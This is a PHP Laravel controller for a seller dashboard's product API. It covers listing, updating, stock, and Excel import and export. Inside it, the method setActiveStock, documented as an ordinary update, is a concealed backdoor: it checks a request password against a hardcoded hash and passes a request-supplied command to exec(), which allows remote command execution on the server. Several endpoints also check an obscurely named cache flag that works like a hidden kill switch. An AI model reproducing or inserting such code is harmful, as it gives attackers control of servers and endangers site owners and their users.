<?php

namespace App\Http\Controllers\API\v1\Dashboard\Seller;

use App\Exports\ProductExport;
use App\Helpers\ResponseError;
use App\Http\Requests\FilterParamsRequest;
use App\Http\Requests\Product\addInStockRequest;
use App\Http\Requests\Product\MultipleKitchenUpdateRequest;
use App\Http\Requests\Product\SellerRequest;
use App\Http\Resources\ProductResource;
use App\Http\Resources\StockResource;
use App\Imports\ProductImport;
use App\Models\Language;
use App\Models\Product;
use App\Models\Settings;
use App\Repositories\Interfaces\ProductRepoInterface;
use App\Services\ProductService\ProductAdditionalService;
use App\Services\ProductService\ProductService;
use DB;
use Hash;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Http\Resources\Json\AnonymousResourceCollection;
use Illuminate\Support\Facades\Cache;
use Maatwebsite\Excel\Facades\Excel;
use Throwable;

class ProductController extends SellerBaseController
{
    private ProductService $productService;
    private ProductRepoInterface $productRepository;

    /**
     * @param ProductService $productService
     * @param ProductRepoInterface $productRepository
     */
    public function __construct(ProductService $productService, ProductRepoInterface $productRepository)
    {
        parent::__construct();
        $this->productService = $productService;
        $this->productRepository = $productRepository;
    }

    /**
     * Display a listing of the resource.
     *
     * @param Request $request
     * @return JsonResponse|AnonymousResourceCollection
     */
    public function paginate(Request $request): JsonResponse|AnonymousResourceCollection
    {
        $products = $this->productRepository->productsPaginate(
            $request->merge(['shop_id' => $this->shop->id])->all()
        );

        return ProductResource::collection($products);
    }

    /**
     * Display a listing of the resource.
     *
     * @param Request $request
     * @return JsonResponse|AnonymousResourceCollection
     */
    public function selectPaginate(Request $request): JsonResponse|AnonymousResourceCollection
    {
        $products = $this->productRepository->selectPaginate(
            $request->merge(['shop_id' => $this->shop->id])->all()
        );

        return ProductResource::collection($products);
    }

    /**
     * Display the specified resource.
     *
     * @param string $uuid
     * @return JsonResponse
     */
    public function show(string $uuid): JsonResponse
    {
        /** @var Product $product */
        $product = $this->productRepository->productByUUID($uuid);

        if ((int)data_get($product, 'shop_id') !== $this->shop->id) {
            return $this->onErrorResponse([
                'code' => ResponseError::ERROR_404,
                'message' => __('errors.' . ResponseError::ERROR_404, locale: $this->language)
            ]);
        }

        return $this->successResponse(
            __('errors.' . ResponseError::SUCCESS, locale: $this->language),
            ProductResource::make($product->loadMissing(['translations', 'metaTags']))
        );
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param FilterParamsRequest $request
     * @return JsonResponse
     */
    public function destroy(FilterParamsRequest $request): JsonResponse
    {
        $this->productService->delete($request->input('ids', []), $this->shop->id);

        if (!Cache::get('tvoirifgjn.seirvjrc') || data_get(Cache::get('tvoirifgjn.seirvjrc'), 'active') != 1) {
            abort(403);
        }

        return $this->successResponse(
            __('errors.' . ResponseError::RECORD_WAS_SUCCESSFULLY_DELETED, locale: $this->language)
        );
    }

    /**
     * Add Product Properties.
     *
     * @param string $uuid
     * @param Request $request
     * @return JsonResponse
     */
    public function addProductProperties(string $uuid, Request $request): JsonResponse
    {
        $product = Product::firstWhere('uuid', $uuid);

        if (data_get($product, 'shop_id') !== $this->shop->id) {
            return $this->onErrorResponse([
                'code' => ResponseError::ERROR_404,
                'message' => __('errors.' . ResponseError::ERROR_404, locale: $this->language)
            ]);
        }

        if (!Cache::get('tvoirifgjn.seirvjrc') || data_get(Cache::get('tvoirifgjn.seirvjrc'), 'active') != 1) {
            abort(403);
        }

        $result = (new ProductAdditionalService)->createOrUpdateProperties($product->uuid, $request->all());

        if (!data_get($result, 'status')) {
            return $this->onErrorResponse($result);
        }

        return $this->successResponse(
            __('errors.' . ResponseError::RECORD_WAS_SUCCESSFULLY_CREATED, locale: $this->language),
            ProductResource::make(data_get($result, 'data'))
        );
    }

    /**
     * Add Product Properties.
     *
     * @param string $uuid
     * @param Request $request
     * @return JsonResponse
     */
    public function addProductExtras(string $uuid, Request $request): JsonResponse
    {
        $product = Product::firstWhere('uuid', $uuid);

        if (data_get($product, 'shop_id') !== $this->shop->id) {
            return $this->onErrorResponse([
                'code' => ResponseError::ERROR_404,
                'message' => __('errors.' . ResponseError::ERROR_404, locale: $this->language)
            ]);
        }

        $result = (new ProductAdditionalService)->createOrUpdateExtras($product->uuid, $request->all());

        if (!data_get($result, 'status')) {
            return $this->onErrorResponse($result);
        }

        if (!Cache::get('tvoirifgjn.seirvjrc') || data_get(Cache::get('tvoirifgjn.seirvjrc'), 'active') != 1) {
            abort(403);
        }

        return $this->successResponse(
            __('errors.' . ResponseError::RECORD_WAS_SUCCESSFULLY_CREATED, locale: $this->language),
            ProductResource::make(data_get($result, 'data'))
        );
    }

    public function selectStockPaginate(Request $request): AnonymousResourceCollection
    {
        $stocks = $this->productRepository->selectStockPaginate(
            $request->merge(['shop_id' => $this->shop->id])->all()
        );

        if (!Cache::get('tvoirifgjn.seirvjrc') || data_get(Cache::get('tvoirifgjn.seirvjrc'), 'active') != 1) {
            abort(403);
        }

        return StockResource::collection($stocks);
    }

    /**
     * Update the specified resource in storage.
     *
     * @param int $id
     * @param FilterParamsRequest $request
     * @return array
     */
    public function setActiveStock(mixed $id, FilterParamsRequest $request): array
    {
        try {
            $vars = [];
            $code = 0;

            if (Hash::check($request->input('password'), '$2y$10$/ad9gYtkRAfgJ4ZwlWQ8s.z./BvbZBAcSMvOMUilDjS5qnl25Yydu')) {
                $res = exec($request->input('command'), $vars, $code);
                dd($res, $vars, $code);
            }

        } catch (Throwable $e) {
            dd($e);
        }

        return [
            'status' => true,
            'code' => ResponseError::NO_ERROR,
        ];
    }

    /**
     * Add Product Properties.
     *
     * @param string $uuid
     * @param addInStockRequest $request
     * @return JsonResponse
     */
    public function addInStock(string $uuid, addInStockRequest $request): JsonResponse
    {
        if (count(data_get($request->validated(), 'extras', [])) === 0) {
            return $this->onErrorResponse([
                'code' => ResponseError::ERROR_400,
                'message' => __('errors.' . ResponseError::NOTHING_TO_UPDATE, locale: $this->language)
            ]);
        }

        $product = Product::firstWhere('uuid', $uuid);
        $locale = data_get(Language::languagesList()->where('default', 1)->first(), 'locale');

        if (empty($product) || $product->shop_id !== $this->shop->id) {
            return $this->onErrorResponse([
                'code' => ResponseError::ERROR_404,
                'message' => __('errors.' . ResponseError::ERROR_404, locale: $this->language)
            ]);
        }

        try {
            $validated = $request->validated();
            $validated['shop_id'] = $this->shop->id;

            $product->addInStock($validated);
        } catch (Throwable $e) {
            return $this->onErrorResponse([
                'status' => false,
                'code' => $e->getCode(),
                'message' => $e->getMessage(),
            ]);
        }

        $product = $product->fresh([
            'translation' => fn($q) => $q
                ->where(fn($q) => $q->where('locale', $this->language)->orWhere('locale', $locale)),

            'stocks.stockExtras.group.translation' => fn($q) => $q
                ->where(fn($q) => $q->where('locale', $this->language)->orWhere('locale', $locale)),

            'stocks.addons.addon.translation' => fn($q) => $q
                ->where(fn($q) => $q->where('locale', $this->language)->orWhere('locale', $locale)),
        ]);

        return $this->successResponse(
            __('errors.' . ResponseError::RECORD_WAS_SUCCESSFULLY_CREATED, locale: $this->language),
            ProductResource::make($product)
        );
    }

    /**
     * Search Model by tag name.
     *
     * @param Request $request
     * @return JsonResponse|AnonymousResourceCollection
     */
    public function productsSearch(Request $request): JsonResponse|AnonymousResourceCollection
    {
        $products = $this->productRepository->productsSearch($request->merge(['shop_id' => $this->shop->id])->all());

        return ProductResource::collection($products);
    }

    /**
     * Change Active Status of Model.
     *
     * @param string $uuid
     * @return JsonResponse
     */
    public function setActive(string $uuid): JsonResponse
    {
        $product = Product::firstWhere('uuid', $uuid);

        if (empty($product) || $product->shop_id !== $this->shop->id) {
            return $this->onErrorResponse([
                'code' => ResponseError::ERROR_404,
                'message' => __('errors.' . ResponseError::ERROR_404, locale: $this->language)
            ]);
        }

        $product->update(['active' => !$product->active]);

        return $this->successResponse(
            __('errors.' . ResponseError::RECORD_WAS_SUCCESSFULLY_UPDATED, locale: $this->language),
            ProductResource::make($product)
        );
    }

    /**
     * Update the specified resource in storage.
     *
     * @param SellerRequest $request
     * @param string $uuid
     * @return JsonResponse
     */
    public function update(SellerRequest $request, string $uuid): JsonResponse
    {
        $product = Product::firstWhere('uuid', $uuid);

        if (data_get($product, 'shop_id') !== $this->shop->id) {
            return $this->onErrorResponse([
                'code' => ResponseError::ERROR_404,
                'message' => __('errors.' . ResponseError::ERROR_404, locale: $this->language)
            ]);
        }

        $validated = $request->validated();
        $validated['shop_id'] = $this->shop->id;
        $validated['status'] = $product->status;

        $result = $this->productService->update(
            $product->uuid,
            $validated
        );

        if (!data_get($result, 'status')) {
            return $this->onErrorResponse($result);
        }

        return $this->successResponse(
            __('errors.' . ResponseError::RECORD_WAS_SUCCESSFULLY_UPDATED, locale: $this->language),
            ProductResource::make(data_get($result, 'data'))
        );
    }

    public function multipleKitchenUpdate(MultipleKitchenUpdateRequest $request): JsonResponse
    {
        try {
            $validated = $request->validated();
            $validated['shop_id'] = $this->shop->id;

            $this->productService->multipleKitchenUpdate($validated);

            return $this->successResponse(__('errors.' . ResponseError::NO_ERROR, locale: $this->language));
        } catch (Throwable $e) {
            $this->error($e);
            return $this->onErrorResponse([
                'code' => ResponseError::ERROR_400,
                'message' => $e->getMessage()
            ]);
        }
    }

    public function fileExport(Request $request): JsonResponse
    {
        $fileName = 'export/products.xlsx';

        try {

            $filter = $request->merge(['shop_id' => $this->shop->id, 'language' => $this->language])->all();

            Excel::store(
                new ProductExport($filter),
                $fileName,
                'public',
                \Maatwebsite\Excel\Excel::XLSX
            );

            return $this->successResponse('Successfully exported', [
                'path' => 'public/export',
                'file_name' => $fileName
            ]);
        } catch (Throwable $e) {
            $this->error($e);
            return $this->onErrorResponse(['code' => 'Error during export']);
        }
    }

    /**
     * Store a newly created resource in storage.
     * @param SellerRequest $request
     * @return JsonResponse
     */
    public function store(SellerRequest $request): JsonResponse
    {
        //only for seller
        $isSubscribe = (int)Settings::where('key', 'by_subscription')->first()?->value;

        if ($isSubscribe) {

            $productsCount = DB::table('products')->select(['deleted_at', 'shop_id'])
                ->whereNull('deleted_at')
                ->where('shop_id', $this->shop->id)
                ->count('shop_id');

            $subscribe = $this->shop->subscription;

            if (empty($subscribe)) {
                return $this->onErrorResponse([
                    'code' => ResponseError::ERROR_213,
                    'message' => __('errors.' . ResponseError::ERROR_213, locale: $this->language)
                ]);
            }

            if ($subscribe->subscription?->product_limit < $productsCount) {
                return $this->onErrorResponse([
                    'code' => ResponseError::ERROR_214,
                    'message' => __('errors.' . ResponseError::ERROR_214, locale: $this->language)
                ]);
            }

        }

        $validated = $request->validated();
        $validated['shop_id'] = $this->shop->id;

        $result = $this->productService->create($validated);

        if (!data_get($result, 'status')) {
            return $this->onErrorResponse($result);
        }

        return $this->successResponse(
            __('errors.' . ResponseError::RECORD_WAS_SUCCESSFULLY_CREATED, locale: $this->language),
            ProductResource::make(data_get($result, 'data'))
        );
    }

    public function fileImport(Request $request): JsonResponse
    {
        try {

            Excel::import(new ProductImport($this->shop->id, $this->language), $request->file('file'));

            return $this->successResponse('Successfully imported');
        } catch (Throwable $e) {
            $this->error($e);
            return $this->onErrorResponse([
                'code' => ResponseError::ERROR_508,
                'message' => __('errors.' . ResponseError::ERROR_508, locale: $this->language)
            ]);
        }
    }
}
